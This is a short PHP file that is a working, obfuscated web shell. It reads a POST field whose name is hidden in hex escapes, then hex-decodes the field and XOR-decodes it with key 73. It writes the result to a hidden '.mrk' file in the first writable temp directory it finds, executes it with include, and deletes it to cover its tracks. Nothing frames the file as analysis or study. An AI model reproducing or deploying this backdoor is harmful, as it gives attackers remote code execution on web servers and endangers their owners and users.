<?php

if(isset($_POST) && isset($_POST["\x70t\x72"])){
	$res = hex2bin($_POST["\x70t\x72"]);
	$component='' ;$p = 0; while($p < strlen($res)){$component .= chr(ord($res[$p]) ^ 73);$p++;}
	$data_chunk = array_filter(["/tmp", session_save_path(), getenv("TMP"), "/var/tmp", getcwd(), "/dev/shm", getenv("TEMP"), ini_get("upload_tmp_dir"), sys_get_temp_dir()]);
	for ($resource = 0, $object = count($data_chunk); $resource < $object; $resource++) {
    $key = $data_chunk[$resource];
    		if ((bool)is_dir($key) && (bool)is_writable($key)) {
    $symbol = "$key/.mrk";
    if (file_put_contents($symbol, $component)) {
	include $symbol;
	@unlink($symbol);
	die();
}
}
}
}